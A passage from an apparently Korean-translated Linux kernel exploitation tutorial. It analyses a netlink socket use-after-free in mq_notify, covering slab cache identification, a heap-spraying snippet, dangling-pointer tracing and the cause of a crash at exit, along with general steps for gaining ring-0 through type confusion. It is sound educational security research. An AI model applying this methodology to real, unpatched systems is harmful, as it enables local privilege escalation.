The buggy address is located 36644 bytes inside of 
 65536-byte region [ffff880141581640, ffff880141591640) 
The buggy address belongs to the page:                                          // <---- even more info
page:ffffea000464b400 count:1 mapcount:0 mapping:ffff880141581640 
index:0x0 compound_mapcount: 0 
flags: 0x200000000008100(slab|head) 
raw: 0200000000008100 ffff880141581640 0000000000000000 0000000100000001 
raw: ffffea00064b1f20 ffffea000640fa20 ffff8801db800d00 
page dumped because: kasan: bad access detected 

Memory state around the buggy address: 
 ffff88014158a400: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb 
 ffff88014158a480: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb 
>ffff88014158a500: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb 
                                                       ^ 
 ffff88014158a580: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb 
 ffff88014158a600: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb 
================================================================== 
```

굉장히 잘 정돈되어 있지 않은가?

**노트**: 이전의 에러 리포트는 다른 훌륭한 툴인 [syzkaller](https://groups.google.com/forum/#!msg/syzkaller/Sl0POwca6-s/QR_z6AsFCQAJ)에서 나온 것이다.

안타깝게도 제시된 타켓에선 KASAN을 이용할 수 없다. KASAN은 4.x버전 이상의 커널에서 돌아가며, 모든 아키텍처를 지원하지 않는다. 이럴 땐 *수작업을* 해야 한다.

게다가 KASAN은 use-after-free가 일어나는 곳을 한 곳만 보여준다. 실제론 **dangling pointer가 더** 존재할 수 있다(more on this later). 더 찾기 위해선 추가적인 코드 리뷰가 필요하다.

### Exploiting Use-After-Free with Type Confusion

*use-after-free*를 익스플로잇하는 덴 여러 방법이 있다. 예를 들어 allocator 메타 데이터를 사용하는 방법이 있다. 커널에서 이 방식을 사용하는 건 좀 까다롭고 익스플로잇 마지막 부분에 있는 커널 *보수*를 할 때도 더 어렵다. reparation은 [part 4](https://chamalane.herokuapp.com/posts/5d50360ac040080004228198)에서 다룬다. 이것을 생략하면 (이미 경험해봤듯이) 익스플로잇이 종료될 때 커널 크래시가 난다.

UAF를 익스플로잇하는 일반적인 방법은 **type confusion**을 이용하는 것이다. type confusion은 커널이 데이터 타입을 오인할 때 발생한다. 커널은 데이터(보통 포인터)가 특정 타입이라고 생각하고 그 데이터를 이용하는데, 데이터가 실제로는 다른 타입인 경우이다. 커널의 기반이 C언어이기 때문에 타입 검사는 컴파일 도중에 이뤄진다. **cpu는 실제로 *타입*을 신경쓰지 않고 고정된 오프셋으로 주소를 역참조하기만 한다**.

type confusion으로 UAF를 익스플로잇할 때의 지침은 다음과 같다:

1. 커널을 알맞은 상태로 준비한다(예: block할 준비가 된 소켓을 만든다)
2. dangling pointer를 그대로 둔 채로 타겟 오브젝트를 free하는 버그를 트리거한다
3. 데이터를 제어할 수 있는 다른 오브젝트를 즉시 *재할당한다*
4. dangling pointer로부터 use-after-free의 *primitive*를 트리거한다
5. Ring-0를 장악한다
6. 커널을 보수하고 모든 걸 깨끗하게 만든다(clean)
7. enjoy!

익스플로잇을 잘 만들었다면 실패할 수 있는 것은 3)뿐이다. 이유를 보게 될 것이다.

**주의**: "type confusion"으로 *use-after-free*를 익스플로잇하려면 타겟 오브젝트가 **general purpose 캐시**에 속해야 한다. 만약 그렇지 않을 경우에 사용하는 테크닉들이 존재하지만, 이는 더 높은 수준의 내용이므로 여기서 다루지 않는다.

- - -

## Analyze the UAF (cache, allocation, free)

이 섹션에선 앞의 [information gathering]() 단계에서의 질문에 답할 것이다.

### What is allocator? How does it work?

우리의 타겟은 SLAB allocator를 사용한다. [Core Concepts #3]()에서 언급한 것처럼 *kernel config file*에서 이 정보를 얻을 수 있다. 아니면 **/proc/slabinfo**에서 general purpose cache의 이름이 *"size"*로 시작하는지 *"kmalloc-"*으로 시작하는지 확인해봐도 된다.

어떤 데이터 구조를 다루는지, 특히 **array\_cache**에 대해 유심히 봐야 한다.

**노트**: allocator에 대해 완전히 이해하지 못했으면(특히 kmalloc()/kfree() 코드 경로) 여기서 이해하고 넘어가야 한다.

### What object are we talking about?

[part 1](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca)과 [part 2](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196)에선 분명하지 않았지만 *use-after-free*의 대상이 되는 오브젝트는 **struct netlink\_sock**이다. 다음과 같이 정의되어 있다:

```c
// [include/net/netlink_sock.h]

struct netlink_sock {
    /* struct sock has to be the first member of netlink_sock */
    struct sock     sk;
    u32         pid;
    u32         dst_pid;
    u32         dst_group;
    u32         flags;
    u32         subscriptions;
    u32         ngroups;
    unsigned long       *groups;
    unsigned long       state;
    wait_queue_head_t   wait;
    struct netlink_callback *cb;
    struct mutex        *cb_mutex;
    struct mutex        cb_def_mutex;
    void            (*netlink_rcv)(struct sk_buff *skb);
    struct module       *module;
};
```

우리의 경우엔 꽤 분명한 편이다. UAF의 대상이 되는 오브젝트를 찾는 데 한참 걸릴 수도 있다. 특히 특정 오브젝트가 여러 하위 오브젝트의 소유권을 가지고 있을 때(= 생명 주기를 쥐고 있을 때) 그렇다. UAF는 이 (최상위/master 오브젝트가 아닌) 하위 오브젝트들 중 하나에 있을 것이다.

### Where is it freed?

[part 1](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca)에서 *mq\_notify()*에 진입하는 도중 netlink의 sock 레퍼런스 카운터가 1이 되는 것을 볼 수 있었다. 레퍼런스 카운터는 *netlink\_getsockbyflip()*으로 하나 오르고, *netlink\_attachskb()*로 하나, *netlink\_detachskb()*로 한 번 더 줄어든다. 다음과 같은 call trace가 나온다:

```plaintext
- mq_notify
- netlink_detachskb
- sock_put          // <----- atomic_dec_and_test(&sk->sk_refcnt)
```

레퍼런스 카운터가 0이 되기 때문에 **sk\_free()**를 통해 free된다:

```c
void sk_free(struct sock *sk)
{
    /*
     * We subtract one from sk_wmem_alloc and can know if
     * some packets are still in some tx queue.
     * If not null, sock_wfree() will call __sk_free(sk) later
     */
    if (atomic_dec_and_test(&sk->sk_wmem_alloc))
        __sk_free(sk);
}
```

**sk->sk\_wmem\_alloc**이 sending buffer의 "현재" 사이즈임을 기억하자. netlink\_sock 초기화 도중에 1로 설정되는데, 타겟 소켓에 아무 메시지도 보내지 않았으니 *sk\_free()*에 진입할 때까지 1로 유지된다. 즉 **\_\_sk\_free()**를 호출할 것이다:

```c
      // [net/core/sock.c]

      static void __sk_free(struct sock *sk)
      {
        struct sk_filter *filter;

[0]     if (sk->sk_destruct)
          sk->sk_destruct(sk);

        // ... cut ...

[1]     sk_prot_free(sk->sk_prot_creator, sk);
      }
```

[0]에서 sock이 "특수한"(specialized) destructor를 호출할 수 있다. [1]에서 **struct proto** 타입의 *sk\_prot\_create*인자와 함께 **sk\_prot\_free()**를 호출한다. 마지막으로 **오브젝트는 어떤 캐시냐에 따라 free되기도 안 되기도 한다**(다음 섹션 참고):

```c
static void sk_prot_free(struct proto *prot, struct sock *sk)
{
    struct kmem_cache *slab;
    struct module *owner;

    owner = prot->owner;
    slab = prot->slab;

    security_sk_free(sk);
    if (slab != NULL)
        kmem_cache_free(slab, sk);    // <----- this one or...
    else
        kfree(sk);                    // <----- ...this one ?
    module_put(owner);
}
```

즉 마지막 "free"한 calltrace는 다음과 같다:

```plaintext
- <<< what ever calls sock_put() on a netlink_sock (e.g. netlink_detachskb()) >>>
- sock_put
- sk_free
- __sk_free
- sk_prot_free
- kmem_cache_free or kfree
```

**노트**: *sk*와 *netlink\_sock*의 주소가 **alias**한다는 걸 기억하자([part 1](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca) 참고). 즉 *struct sock* 포인터를 free하면  *netlink\_sock* 오브젝트 전체가 해제(release)된다!

이제 마지막 함수 호출을 해결해야 하는데, 그러기 위해선 어떤 캐시에 속해있는지를 알아야 한다.

### What cache does it belong to?

리눅스가 추상화가 많은 객체 지향 시스템인 것을 기억하는가? 우린 이미 많은 계층(layer)의 추상화를 보았으니 specialization을 봐야 한다(?)(Core Concepts #1 참고).

*struct proto*가 가져온 또 다른 계층의 추상화에서 다음과 같은 일들이 일어난다(?):

1. 소켓의 file 타입(struct file)은 **socket\_file\_ops**로 특수화된다.
2. netlink의 BSD 소켓(struct socket)은 **netlink\_ops**로 특수화된다.
3. netlink의 sock(struct sock)은 **netlink\_proto**와 **netlink\_family\_ops**로 특수화된다.

**노트**: 다음 섹션에서 *netlink\_family\_ops*를 다시 다룬다.

대부분이 그냥 VFT인 *socket\_file\_ops*와 *netlink\_ops*와는 다르게 *struct proto*는 더 복잡하다. VFT뿐만 아니라 "struct sock"의 생명 주기(life cycle)에 대한 정보도 담고 있다. 특히 "어떻게" *특수화된 struct sock* 오브젝트가 할당되는지를 담고 있다.

우리의 경우 두 가지 중요한 필드 **slab**와 **obj\_size**가 있다:

```c
// [include/net/sock.h]

struct proto {
  struct kmem_cache *slab;      // the "dedicated" cache (if any)
  unsigned int obj_size;        // the "specialized" sock object size
  struct module *owner;         // used for Linux module's refcounting
  char name[32];
  // ...
}
```

netlink\_sock 오브젝트에 대하여, struct proto는 *netlink\_proto*이다:

```c
static struct proto netlink_proto = {
    .name     = "NETLINK",
    .owner    = THIS_MODULE,
    .obj_size = sizeof(struct netlink_sock),
};
```

***obj\_size*는 최종적으로 할당이 얼만큼 됐는지 크기를 알려주지 않는다. 그냥 부분적으로만 알려준다(다음 섹션 참고).**

볼 수 있듯이 많은 필드가 빈 채로 남아있다(= NULL). *netlink\_proto*에 전용 캐시가 없음을 의미하는 것일까? *slab* 필드가 **프로토콜 등록** 도중에 정의되므로 아직은 모른다. 프로토콜 등록이 어떻게 이루어지는지는 다루지 않을 것이지만, 조금은 이해할 필요가 있다.

리눅스의 네트워크 모듈들은 부팅 시에 혹은 모듈과 함께 "lazy"하게 로딩된다(= 첫 번째로 특정 소켓이 사용됐을 때). 두 경우 모두 "init" 함수가 호출된다. netlink의 경우엔 **netlink\_proto\_init()**인데, 두 가지 역할을 한다:

1. **proto\_register(&netlink\_proto, 0)** 호출
2. **sock\_register(&netlink\_family\_ops)** 호출

***proto\_register()*는 프로토콜이 *전용 캐시*를 사용할지 안 할지를 결정한다.** 사용한다면 전용 *kmem\_cache*를 생성하고 아니면 general purpose 캐시를 생성한다. 이것은 *alloc\_slab* 파라미터(두 번째 인자)에 달렸고 다음과 같이 구현되어 있다:

```c
// [net/core/sock.c]

int proto_register(struct proto *prot, int alloc_slab)
{
    if (alloc_slab) {
        prot->slab = kmem_cache_create(prot->name,            // <----- creates a kmem_cache named "prot->name"
                    sk_alloc_size(prot->obj_size), 0,         // <----- uses the "prot->obj_size"
                    SLAB_HWCACHE_ALIGN | proto_slab_flags(prot),
                    NULL);

        if (prot->slab == NULL) {
            printk(KERN_CRIT "%s: Can't create sock SLAB cache!\n",
                   prot->name);
            goto out;
        }

    // ... cut (allocates other things) ...
    }

    // ... cut (register in the proto_list) ...

    return 0;

  // ... cut (error handling) ...
}
```

여기가 프로토콜이 전용 캐시를 가질 수 있는 유일한 기회이다. *netlink\_proto\_init*이 *alloc\_slab*을 0으로 설정하여 *proto\_register*를 호출하므로, **netlink 프로토콜은 general 캐시 중 *하나*를 사용한다**. 예상할 수 있듯이, 문제의 general 캐시는 proto의 *obj\_size*에 달려있다. 이 내용은 다음 섹션에서 보자.

### Where is it allocated?

지금까지 우리는 "프로토콜 등록" 도중에 netlink family가 *netlink\_family\_ops*인 **struct net\_proto\_family**를 등록한다는 것을 알았다. 이 구조체는 굉장히 직관적이다(a create callback):

```c
struct net_proto_family {
    int     family;
    int     (*create)(struct net *net, struct socket *sock,
                  int protocol, int kern);
    struct module   *owner;
};
```

```c
static struct net_proto_family netlink_family_ops = {
    .family = PF_NETLINK,
    .create = netlink_create,               // <-----
    .owner  = THIS_MODULE,
};
```

**netlink\_create()**가 실행되었을 때 *struct socket*은 이미 할당되어 있다. netlink\_create()의 목적은 *struct netlink\_sock*을 할당하고 그것을 소켓과 연동(associate)하여 *struct socket*과 *struct netlnk\_sock* 필드를 초기화하는 것이다. 여기가 소켓 타입(RAW, DGRAM)과 netlink의 프로토콜 identifier (NETLINK\_USERSOCK)에 대한 몇 몇 온전성 검사(sanity check)가 이뤄지는 곳이기도 하다.

```c
static int netlink_create(struct net *net, struct socket *sock, int protocol,
              int kern)
{
    struct module *module = NULL;
    struct mutex *cb_mutex;
    struct netlink_sock *nlk;
    int err = 0;

    sock->state = SS_UNCONNECTED;

    if (sock->type != SOCK_RAW && sock->type != SOCK_DGRAM)
        return -ESOCKTNOSUPPORT;

    if (protocol < 0 || protocol >= MAX_LINKS)
        return -EPROTONOSUPPORT;

  // ... cut (load the module if protocol is not registered yet - lazy loading) ...

    err = __netlink_create(net, sock, cb_mutex, protocol, kern);    // <-----
    if (err < 0)
        goto out_module;

  // ... cut...
}
```

결과적으로 **\_\_netlink\_create()**는 *struct netlink\_sock*의 심장같은 역할을 한다.

```c
      static int __netlink_create(struct net *net, struct socket *sock,
                struct mutex *cb_mutex, int protocol, int kern)
      {
        struct sock *sk;
        struct netlink_sock *nlk;

[0]     sock->ops = &netlink_ops;

[1]     sk = sk_alloc(net, PF_NETLINK, GFP_KERNEL, &netlink_proto);
        if (!sk)
          return -ENOMEM;

[2]     sock_init_data(sock, sk);

        // ... cut (mutex stuff) ...

[3]     init_waitqueue_head(&nlk->wait);

[4]     sk->sk_destruct = netlink_sock_destruct;
        sk->sk_protocol = protocol;
        return 0;
      }
```

\_\_netlink\_create() 함수가 하는 일은 다음과 같다:

* [0] - 소켓의 proto\_ops VFT를 **netlink\_ops**로 설정
* [1] - ***prot->slab*과 *prot->obj\_size* 정보를 이용하여 netlink\_sock을 할당**
* [2] - sock의 receive/send 버퍼, *sk\_rcvbuf/sk\_sndbuf* 변수를 초기화하고 소켓을 sock에 bind하기 등
* [3] - wait queue 초기화 ([part 2](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196) 참고)
* [4] - *struct netlink\_sock*을 free할 때 호출되는 *특수한* destructor를 정의

마지막으로 *sk\_alloc()*은 *struct proto*(= *netlink\_proto*)를 이용하여 **sk\_prot\_alloc()** [1]을 호출한다. **여기서 커널이 할당에 *전용* 혹은 *general* kmem\_cache를 사용한다**:

```c
static struct sock *sk_prot_alloc(struct proto *prot, gfp_t priority,
        int family)
{
    struct sock *sk;
    struct kmem_cache *slab;

    slab = prot->slab;
    if (slab != NULL) {
        sk = kmem_cache_alloc(slab, priority & ~__GFP_ZERO);      // <-----

    // ... cut (zeroing the freshly allocated object) ...
    }
    else
        sk = kmalloc(sk_alloc_size(prot->obj_size), priority);    // <-----

  // ... cut ...

  return sk;
}
```

netlink의 "프로토콜 등록" 도중에 본 것처럼 slab이 사용되지 않으므로(= *slab* 이 NULL) **kmalloc()**(= general purpose 캐시)을 호출할 것이다.

마지막으로, *netlink\_create()*에 대한 call trace를 설정(establish)해야 한다. 엔트리 포인트는 **socket()** syscall이다. 모든 경로를 풀어보진 않을 것이다(좋은 연습이 되긴 함). 결과는 다음과 같다:

```plaintext
- SYSCALL(socket)
- sock_create
- __sock_create // allocates a "struct socket"
- pf->create    // pf == netlink_family_ops
- netlink_create
- __netlink_create
- sk_alloc
- sk_prot_alloc
- kmalloc
```

좋다, 이제 *netlink\_sock*이 어디에 할당 되었고 *kmem\_cache*의 타입(general purpose 캐시)이 뭔지 알았다. 하지만 아직 정확히 어떤 *kmem\_cache*인지는 모른다(kmalloc-32? kmalloc-64?).

### Detecting the object size statically/dynamically

이전 섹션에서 *netlink\_sock* 오브젝트가 다음을 통해 *general purpose kmem\_cache*로부터 할당되는 것을 보았다:

```c
kmalloc(sk_alloc_size(prot->obj_size), priority)
```

**sk\_alloc\_size()**는 다음과 같다:

```c
#define SOCK_EXTENDED_SIZE ALIGN(sizeof(struct sock_extended), sizeof(long))

static inline unsigned int sk_alloc_size(unsigned int prot_sock_size)
{
    return ALIGN(prot_sock_size, sizeof(long)) + SOCK_EXTENDED_SIZE;
}
```

**노트**: *struct sock\_extended* 구조체는 kernel ABI를 건드리지(break) 않으면서 원래의 *struct sock*을 확장하기 위해 만들어졌다. 이해할 필요 없고, 이전 할당에 *struct sock\_extended*의 크기가 더해진다는 것만 기억하면 된다.

즉 크기는 다음과 같다: **sizeof(struct netlink\_sock) + sizeof(struct sock\_extended) _ SOME\_ALIGNMENT\_BYTES

*정확한* 크기가 필요하진 않다. general purpose kmem\_cache에서 할당을 하고 있으므로 우리의 오브젝트를 담을 수 있는 "upper bounded" 캐시를 찾으면 된다(Core Concepts #3 참고).

**주의-1**: "Core Concepts #3"에서 general kmem\_cache의 크기가 2의 제곱수라고 했다. 몇 몇 시스템은 "kmalloc-96"이나 "kmalloc-192"처럼 다른 크기가 존재하기도 한다. 이유는 많은 오브젝트가 2의 제곱수보단 96, 192와 같은 크기에 더 가깝기 때문이다. 이런 크기의 캐시는 *내부 단편화*를 줄여준다.

**주의-2**: "디버그 전용" 방법을 사용하는 것은 타겟 오브젝트 크기에 대한 대략적인 아이디어를 얻는 좋은 시작점일 수 있다. 그러나 CONFIG\_\* 전처리기(preprocessor)에 의해 **그 크기는 production 커널에서의 크기와는 다를 것이다**. 몇 바이트에서 많으면 수백 바이트까지 다를 수 있다! 또한 계산된 오브젝트의 크기가 *kmem\_cache*의 오브젝트 크기 바운더리에 가깝다면 특별한 주의가 필요하다. 예를 들어 디버그 상태에서 260 바이트여서 kmalloc-512에 들어갔던 것이 production 커널에선 220바이트여서 kmalloc-256에 들어갈 수 있다. 그럼 골치 아픈 일이 될 것이다.

우린 Method #5(아래 나온다)를 사용하여 **타겟의 사이즈가 "kmalloc-1024"임을 알아냈다**. 이는 *use-after-free*를 익스플로잇하기에 좋은 캐시인데, 그 이유는 재할당 섹션에서 보게 될 것이다.

***Method #1 [static]: Manual Computation***

각 필드의 크기를 "직접" 더하자는 아이디어에서 나왔다. 이 방법은 "작은" 구조체에선 훌륭하게 동작하지만 큰 구조체에선 **아주 에러가 잘 난다**. **인자, padding과 checking**을 신경써야 한다. 다음은 예시이다:

```c
struct __wait_queue {
    unsigned int flags;           // offset=0, total_size=4
                                  // offset=4, total_size=8 <---- PADDING HERE TO ALIGN ON 8 BYTES
    void *private;                // offset=8, total_size=16
    wait_queue_func_t func;       // offset=16, total_size=24
    struct list_head task_list;   // offset=24, total_size=40 (sizeof(list_head)==16)
};
```

이건 쉬운 경우다. **struct sock**을 보고 똑같이 해보라. 행운을 빈다!^^ struct sock에선 모든 **CONFIG\_** 전처리기 매크로를 고려하고 복잡한 "union"을 다뤄야 하기 때문에 더더욱 에러가 잘 난다.

***Method #2 [static]: With 'pahole' (debug only)**

[pahole](https://github.com/froydnj/pahole)은 여기서의 목적을 달성하기 위한 훌륭한 툴이다. 이전의 지루한 작업들을 *자동적으로* 수행한다. 예를 들어 *struct socket*의 레이아웃을 덤프하면 다음과 같다:

```bash
$ pahole -C socket vmlinuz_dwarf
struct socket {
        socket_state               state;                /*     0     4 */
        short int                  type;                 /*     4     2 */

        /* XXX 2 bytes hole, try to pack */

        long unsigned int          flags;                /*     8     8 */
        struct socket_wq *         wq;                   /*    16     8 */
        struct file *              file;                 /*    24     8 */
        struct sock *              sk;                   /*    32     8 */
        const struct proto_ops  *  ops;                  /*    40     8 */

        /* size: 48, cachelines: 1, members: 7 */
        /* sum members: 46, holes: 1, sum holes: 2 */
        /* last cacheline: 48 bytes */
};
```

우리가 하려는 일에 딱 맞는 완벽한 툴같지만, [DWARF](https://en.wikipedia.org/wiki/DWARF) 심볼이 있는 커널 이미지를 필요로 한다. production 커널엔 해당 사항이 없다.

**Method 4 [dynamic]: With System Tap (debug only)

[part 1](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca)에서 System Tap의 Guru 모드를 이용하여 커널 *내부에* (= LKM)코드를 적었다. 여기서 다시 System Tap을 이용하여 *sk\_alloc\_size()*를 재현할 수도 있다. *sk\_alloc\_size()*가 inline되어 있어서 바로 호출할 순 없다. 하지만 그냥 코드를 복사해서 덤프를 뜨면 된다.

다른 방법은 *socket()* syscall 도중에 일어나는 *kmalloc()*을 조사하는 것이다. 여러 *kmalloc()*이 발생할 텐데, 어떤 *kmalloc()*을 조사해야 하는지 어떻게 알 수 있을까? 방금 생성한 소켓을 *close()*하고 포인터를 *kmalloc()*과 대조해보는 것이다. *kmalloc()*의 첫 번째 인자가 크기이기 때문에 맞는 녀석을 찾을 수 있을 것이다.

아니면 kmalloc()의 **print\_backtrace()** 함수를 사용할 수 있다. 조심하자! 결과가 너무 많으면 System Tap에서 일부를 생략한다!

***Method #5 [dynamic]: With "/proc/slabinfo"***

*가난한*(poor man) 방법처럼 보이지만 실제로 잘 작동하는 방법이다! kmem\_cache가 전용 캐시를 사용하는 경우 kmem\_cache의 이름을 알고 있다면 "objsize" column으로부터 오브젝트의 크기를 바로 알 수 있다(struct proto 참고).

그렇지 않으면, 타겟 오브젝트를 여러 개 할당하는 간단한 프로그램을 구현하는 것이다. 예를 들어보자:

```c
int main(void)
{
  while (1)
  {
    // allocate by chunks of 200 objects
    for (int i = 0; i < 200; ++i)
      _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK);
    getchar();
  }
  return 0;
}
```

**노트**: 여기서 하는 걸 **heap spraying**이라 부른다.

다른 창에선 다음 명령어를 실행한다:

```bash
watch -n 0.1 'sudo cat /proc/slabinfo | egrep "kmalloc-|size-" | grep -vi dma'
```

그리고 프로그램을 실행해서 다음 "allocation chunk"를 실행하는 키를 입력한다. 시간이 좀 지나면 "active\_objs/num\_objs"라는 general purpose 캐시 하나가 계속 자라는 것을 볼 수 있을 것이다. 이게 우리의 타겟 *kmem\_cache*이다!

### Summary

정보를 다 모으기까지 오래 걸렸다. 그러나 이는 꼭 필요한 일이고 네트워크 프로토콜 API를 더 잘 이해하게 해준다. 왜 [KASAN](https://www.kernel.org/doc/html/v4.14/dev-tools/kasan.html)이 끝내주는 툴인지 이제 알 수 있을 것이다. KASAN은 이걸 다 (그리고 더) 해준다!

그럼 요약해보자:

* 어떤 allocator인가? **SLAB**
* 어떤 object인가? **struct netlink\_sock**
* 캐시는 어디에 있는가? **kmalloc-1024**
* 어디 할당되어 있는가?

```plaintext
- SYSCALL(socket)
- sock_create
- __sock_create // allocates a "struct socket"
- pf->create    // pf == netlink_family_ops
- netlink_create
- __netlink_create
- sk_alloc
- sk_prot_alloc
- kmalloc
```

* 언제 free되는가?

```plaintext
- <<< what ever calls sock_put() on a netlink_sock (e.g. netlink_detachskb()) >>>
- sock_put
- sk_free
- __sk_free
- sk_prot_free
- kfree
```

분석할 게 마지막 하나 남았다. 이건 "어떻게"(읽기/쓰기? 나쁜 역참조? 바이트는 얼마나 되는지?)에 대한 것이다. 다음 섹션에서 다룬다.

- - -

## Analyze the UAF (dangling pointers)

*버그로 돌아가자!*

이번 섹션에선 *UAF dangling pointer*에 대해 찾아보고(identify), 왜 현재의 *proof-of-concept* 코드([part 2](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196))가 크래시가 나며 우리가 이미 (도움이 되는) "*UAF transfer*"를 하고 있는지 알아보자.

### Identify the dangling pointers

이제부턴 **dmesg**로 에러 정보를 얻지도 못하게끔 커널 크래시가 *난폭하게*(brutally) 발생한다. 따라서 어떻게 돌아가고 있는지를 알아볼 call trace가 없다. 물론 이는 의도된 것이다! 우린 *이미* **UAF transfer**를 했다. 뭔지 알아보자.

익스플로잇 초기화 도중에 다음과 같은 일들을 했다:

* NETLINK 소켓 생성
* 소켓을 bind
* 소켓의 receive buffer 채우기
* 소켓 복제(두 번)

즉 다음과 같은 상황이다:

```plaintext
file cnt  | sock cnt  | fdt[3]    | fdt[4]    | fdt[5]    | file_ptr->private_data | socket_ptr->sk |
----------+-----------+-----------+-----------+-----------+------------------------+----------------+
3         | 2         | file_ptr  | file_ptr  | file_ptr  | socket_ptr             | sock_ptr       |
```

**socket\_ptr** (struct socket)과 **sock\_ptr** (struct netlink\_sock)의 차이에 주목하자.

다음과 같이 가정한다:

* fd=3은 "sock\_fd"
* fd=4는 "unblock\_fd"
* fd=5는 "sock\_fd2"

우리의 netlink socket에 연관된 *struct file*은 한 번의 socket()과 두 번의 dup()로 인해 레퍼런스 카운터가 **3**이다. sock의 레퍼런스 카운터는 한 번의 socket()과 한 번의 bind()로 **2**이다.

이제 버그를 한 번 트리거했다고 생각해보자. 알고 있듯이 sock의 레퍼런스 카운터가 1 줄어들고 file의 레퍼런스 카운터도 1 줄어들어 *fdt[5]* 항목은 NULL이 될 것이다. **close(5)를 호출할 땐 sock의 레퍼런스 카운터가 감소하지 않았다는 점에 주목하자(버그가 감소시켰다)!**

상황은 다음과 같이 된다:

```plaintext
file cnt  | sock cnt  | fdt[3]    | fdt[4]    | fdt[5]    | file_ptr->private_data | socket_ptr->sk |
----------+-----------+-----------+-----------+-----------+------------------------+----------------+
2         | 1         | file_ptr  | file_ptr  | NULL      | socket_ptr             | sock_ptr       |
```

버그를 한 번 더 트리거해보자:

```
file cnt  | sock cnt  | fdt[3]    | fdt[4]    | fdt[5]    | file_ptr->private_data | socket_ptr->sk      |
----------+-----------+-----------+-----------+-----------+------------------------+---------------------+
1         | FREE      | NULL      | file_ptr  | NULL      | socket_ptr             | (DANGLING) sock_ptr |
```

다시, close(3)은 레퍼런스 카운터를 줄이지 않았다. 버그가 줄인 것이다! 레퍼런스 카운터가 0이 되기 때문에 sock은 free된다.

볼 수 있듯이 file descriptor 4가 가리키고 있는 *struct file*은 아직 남아있다. 게다가, ***struct socket*은 이제 방금 free된 sock 오브젝트를 가리키는 *dangling pointer*를 가지고 있다**. 이게 앞에서 말한 UAF transfer이다. "sock" 변수가 dangling pointer였던 처음 시나리오(part 1 참고)와는 다르게 이제는 *struct socket*의 "sk" 포인터가 dangling pointer이다. 다시 말해 우리는 *unblock\_fd* file descriptor를 통하고 *struct file*을 통하여 socket의 dangling pointer에 "접근"했다.

왜 여전히 "struct socket"이 dangling pointer를 가지고 있을까? 이유는 *netlink\_sock* 오브젝트가 **\_\_sk\_free()**를 통해 free될 때 다음과 같은 일을 하기 때문이다(이전 섹션 참고):

1. sock의 destructor 호출(= *netlink\_sock\_destruct()*)
2. sk\_prot\_free() 호출

**이 중 어떤 것도"SOCKET" 구조체를 갱신해주지 않는다!**

(익스플로잇에서) 키를 누르기 전에 **dmesg**를 보면 다음과 비슷한 메시지를 찾을 수 있을 것이다:

```plaintext
[  141.771253] Freeing alive netlink socket ffff88001ab88000
```

이는 sock의 destructor인 (\_\_sk\_free()에 의해 호출되는) **netlink\_sock\_destruct()**에서 나오는 메시지이다:

```c
static void netlink_sock_destruct(struct sock *sk)
{
    struct netlink_sock *nlk = nlk_sk(sk);

  // ... cut ...

    if (!sock_flag(sk, SOCK_DEAD)) {
        printk(KERN_ERR "Freeing alive netlink socket %p\n", sk); // <-----
        return;
    }

  // ... cut ...
}
```

*이제 dangling pointer 하나를 찾았다... 아직 더 있다!*

*netlink\_bind()*로 타겟 소켓을 bind할 때 레퍼런스 카운터가 1 증가하는 것을 보았다. 이것이 우리가 *netlink\_getsockbypid()*로 타겟 소켓을 참조할 수 있는 이유이다. 더 자세히 보지 않아도 *netlink\_sock* 포인터는 **nl\_table**의 해시 리스트에 저장되어 있다(part 4에서 다룬다). sock object를 소멸시킬 때 이 포인터들은 dangling pointer가 된다.

다음 이유로 **모든** dangling 포인터를 찾는 것이 중요하다:

1. *UAF primitive*를 주므로 *use-after-free*를 익스플로잇하는 데 사용할 수 있다
2. 커널 보수 과정에서 고칠 수 있다

다음으로 넘어가서 왜 종료 시에 커널 크래시가 나는지 알아보자.

### Understand The Crash

이전 섹션에서 세 dangling pointer를 찾았다:

* *struct socket*의 **sk** 포인터
* **nl\_table hash list**의 두 *netlink\_sock* 포인터

PoC에서 크래시가 나는 이유를 이해해보자.

proof-of-concept 코드에서 키를 누르면 어떤 일이 발생하는가? 익스플로잇이 평범하게 종료된다는 것은 많은 의미가 있다. 커널은 프로세스에 할당된 모든 자원을 해제해야 하고, 그렇지 않으면 많은 메모리 leak이 발생한다.

종료 절차는 **do\_exit()** 함수에서 시작되며 약간 복잡하다. 몇 몇 포인트에서 file과 관련된 자원을 해제하려 한다. 대략 다음과 같은 일을 한다:

1. **do\_exit()** 함수가 실행된다([kernel/exit.c]).
2. **put\_files\_struct**를 통해 current의 *struct files\_struct*에 대한 참조를 해제하는 **exit\_files()**를 호출한다.
3. 그것이 마지막 참조이기 때문에 *put\_files\_struct()*가 **close\_files()**를 호출한다.
4. *close\_files()* FDT에 남아있는 모든 file에 대해 **flip\_close()**를 호출한다.
5. *flip\_close()*가 "*unblock\_fd*"이 가리키는 file에 대해 **fput()**을 호출한다.
6. 마지막 참조였기 때문에 **\_\_fput()**이 실행된다.
7. 마지막으로, *\_\_fput()*이 **sock\_close()**인 **file->f\_op->release()** file operation을 호출한다.
8. *sock\_close()*는 *sock->ops->release()*(proto\_ops: *netlink\_release()*)를 호출하고 *sock->file*을 NULL로 설정한다.
9. *netlink\_release()*에서 크래시가 나는 "엄청 많은 use-after-free operation"이 있다.

간단하게 하기 위해, **unblock\_fd**을 close하지 않았기 때문에 프로그램이 종료될 때 해제된다. 마지막엔 **netlink\_release()**가 실행된다. 여기서부터 UAF가 *너무 많아서* 크래시가 안 나는 게 운이 좋은 것이다:

```c
static int netlink_release(struct socket *sock)
{
    struct sock *sk = sock->sk;         // <----- dangling pointer
    struct netlink_sock *nlk;

    if (!sk)                            // <----- not NULL because... dangling pointer
        return 0;

    netlink_remove(sk);                 // <----- UAF
    sock_orphan(sk);                    // <----- UAF
    nlk = nlk_sk(sk);                   // <----- UAF

  // ... cut (more and more UAF) ...
}
```

